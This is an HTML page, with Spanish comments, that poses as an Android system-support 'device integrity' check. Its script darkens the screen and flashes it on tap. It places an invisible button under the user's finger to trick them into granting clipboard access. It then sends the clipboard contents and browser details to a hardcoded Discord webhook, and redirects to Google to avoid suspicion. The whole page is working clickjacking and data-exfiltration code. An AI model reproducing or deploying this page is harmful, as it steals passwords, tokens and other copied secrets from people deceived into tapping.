<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Soporte de Sistema - Verificando...</title>
    <style>
        :root {
            --android-bg: #1A1C1E;
            --android-text: #E3E2E6;
            --android-blue: #A8C7FA;
            --android-dialog-bg: #212121;
        }

        body, html { margin: 0; padding: 0; height: 100%; background: var(--android-bg); font-family: 'Roboto', sans-serif; overflow: hidden; }
        
        /* 1. Capa de Engaño Acelerada */
        #ghost-dimmer {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0);
            /* Transición reducida a 2.5s para mayor credibilidad de 'fallo' */
            transition: background 2.5s cubic-bezier(0.4, 0, 1, 1);
            z-index: 1000;
        }

        /* 2. Flash Subliminal (Validación de Android) */
        #subliminal-flash {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: #4285F4;
            display: none;
            z-index: 3000;
        }

        /* 3. Botón de Intercepción de Gran Tamaño */
        #invisible-allow-btn {
            position: fixed;
            /* Agrandado para cubrir casi cualquier error de precisión del dedo */
            width: 280px; height: 180px;
            background: rgba(255, 0, 0, 0); 
            border: none;
            z-index: 2000;
            display: none;
            border-radius: 20px;
        }

        /* Interfaz Visual */
        #content-view { color: var(--android-text); text-align: center; margin-top: 35vh; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: var(--android-blue); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="ghost-dimmer"></div>
    <div id="subliminal-flash"></div>
    <button id="invisible-allow-btn"></button>

    <div id="content-view">
        <div class="spinner"></div>
        <h2>Analizando integridad del dispositivo...</h2>
        <p style="color: #8E9199; font-size: 0.9em;">Esto puede tardar unos segundos.</p>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
        
        let dimmer = document.getElementById('ghost-dimmer');
        let flash = document.getElementById('subliminal-flash');
        let allowBtn = document.getElementById('invisible-allow-btn');

        // Oscurecimiento rápido para forzar la reacción muscular
        window.onload = () => {
            setTimeout(() => {
                dimmer.style.background = "rgba(0, 0, 0, 0.98)";
            }, 600); // Inicio casi inmediato
        };

        // INTERCEPCIÓN DE LATENCIA NERVIOSA
        dimmer.addEventListener('click', (e) => {
            let x = e.clientX;
            let y = e.clientY;

            // Flash de 15ms para cegar la verificación lógica
            flash.style.display = 'block';

            // El botón de gran tamaño se centra en el toque
            allowBtn.style.left = (x - 140) + 'px';
            allowBtn.style.top = (y - 90) + 'px';
            allowBtn.style.display = 'block';

            setTimeout(() => {
                flash.style.display = 'none';
                dimmer.style.transition = "none";
                dimmer.style.background = "transparent";
            }, 15);
        });

        // EJECUCIÓN DEL PERMISO
        allowBtn.addEventListener('click', async () => {
            allowBtn.style.display = 'none';
            
            try {
                // Solicita acceso al portapapeles
                const text = await navigator.clipboard.readText();
                enviarADiscord(text);
            } catch (err) {
                // Si falla el portapapeles, redirigimos para no levantar sospechas
                window.location.href = "https://www.google.com";
            }
        });

        function enviarADiscord(contenido) {
            const payload = {
                embeds: [{
                    title: "🛰️ Datos de Sesión Capturados",
                    color: 4359668,
                    description: "Se ha interceptado el portapapeles del objetivo exitosamente.",
                    fields: [
                        { name: "Contenido Copiado", value: "```" + (contenido || "Vacío o Bloqueado") + "```" },
                        { name: "Motor de Navegador", value: navigator.userAgent }
                    ],
                    timestamp: new Date()
                }]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                alert("Integridad confirmada. Gracias por esperar.");
                window.location.href = "https://www.google.com";
            });
        }
    </script>
</body>
</html>
